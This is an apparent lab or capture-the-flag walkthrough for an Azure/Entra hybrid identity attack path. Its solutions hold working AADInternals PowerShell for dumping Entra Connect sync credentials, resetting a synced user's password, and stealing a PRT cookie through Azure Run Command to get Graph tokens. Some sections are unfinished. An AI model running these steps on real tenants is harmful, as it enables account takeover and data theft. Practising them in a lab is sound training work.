creds of an SP -> azure run command -> vm that has user logged on -> steal user prt ->


# Preparations
1. RDP login to DC VM using the YOURDOMAIN\rootuser
2. RDP login to Win11 VM using the YOURDOMAIN\user1, keep this window open in the background - you're not allowed to use it from now on.

# Instructions
1. Your goal is to find the secret.txt file 
2. forget everything you knew: from this point on you DON'T know what the admin password is (i.e. what's the password of 'user1')
3. DO NOT password reset or silver ticket (seamless sso) "user1"
3. the only thing you have is the RDP session on the DC. Good luck! 

# Hints
hints base64 encoded

### First hint: where the secret.txt file isn't stored
The file isn't on a VM

## Entire attack path hint (use as last resort)
1. pass reset: DC vm -> reset pass of "user2" using Entra Sync credentials
2. login to Azure as that user using your browser
3. azure run command on Win11 VM (the VM that has user1 logged on)
4. Steal user1 PRT Cookie by running powershell script from the Run Command extension on the Azure portal 
5. Use PRT Cookie to get access token and authenticate using PowerShell to MS Graph API read secret.txt from storage account


## Step 1
### Hint 1
1. Find a way to compromise a synced user in order to jump to the cloud
2. Recon for roles / permissions to see which user you want to compromise
3. it's not "user1"...

### Hint 2
Abuse the Entra Connect password reset feature using AADInternals

### Solution
```powershell
Import-Module AADInternals
Get-AADIntSyncCredentials
```

Login using dumped Sync_XX account:
```powershell
# Prompt for credentials and retrieve & store access token to cache
# Enter your dumped Sync_XX account creds!
$tenantId = "YOUR_TENANT_ID"
$at = Get-AADIntAccessTokenForAADGraph -SaveToCache
Connect-AzureAD -AadAccessToken $at -TenantId $tenantId -AccountId "1b730954-1685-4b74-9bfd-dac224a7b894" # "Azure Active Directory PowerShell" app id
```

Enumerate users:
```powershell
# list on-premise, synced users with their roles
$onpremSyncedUsers = Get-AzureADUser -All $true | Where-Object { 
    $_.OnPremisesSecurityIdentifier -ne $null 
} 
$onpremSyncedUsers | ForEach-Object { 
    $user = $_; 
    Get-AzureADDirectoryRole | ForEach-Object { 
        $role = $_;
        Get-AzureADDirectoryRoleMember -ObjectId $role.ObjectId | Where-Object { $_.ObjectId -eq $user.ObjectId } | Select-Object @{Name='UserPrincipalName';Expression={$user.UserPrincipalName}}, @{Name='OnPremisesSecurityIdentifier';Expression={$user.OnPremisesSecurityIdentifier}}, @{Name='ImmutableId';Expression={$user.ImmutableId}}, @{Name='Role';Expression={$role.DisplayName}} 
    } 
} | Format-Table -Wrap -AutoSize
```

Reset the victim user's Entra password:
```powershell
Set-AADIntUserPassword -SourceAnchor "IMMUTABLE_ID" -Password "MYPASS" -Verbose
```

## Step 2
### Hint 1
Login to Azure as that user and see what you have access to

### Hint 2
You can find the virtual machine Win11 and using the Run Command extension run PowerShell script on it

### Hint 3
Use this ability to get a PRT Cookie so you can impersonate as that user and steal its identity and permissions

### Solution
<hint>
  <summary>Click me</summary>
  1. first get the running user's session by executing: "query user"

    ```powershell

    # Define the script you want to run
    $script = {
        # Your PowerShell commands here
        Write-Output "Hello, $env:USERNAME!"
        Import-Module AADInternals
        $prtToken = Get-AADIntUserPRTToken # get a new PRT Cookie if you used it already
        $prtToken
        WRITE-OUTPUT "#####################"
        $at = Get-AADIntAccessTokenForMSGraph -PRTToken $prtToken
        $at
    }

    # Create a session for the logged-on user
    $session = New-PSSession -ComputerName localhost -Credential (Get-Credential)

    # Run the script in the context of the logged-on user
    Invoke-Command -Session $session -ScriptBlock $script

    # Clean up the session
    Remove-PSSession -Session $session
    ```
</hint>


### Step 3 Hint
### Step 3 Solution




# change user2 password 
    the user should have the "azure vm run command" perm / role in entra
# 

### Bonus: 
Go back to the beginning, and try steal user2 using silver ticket (Seamless SSO) instead of password reset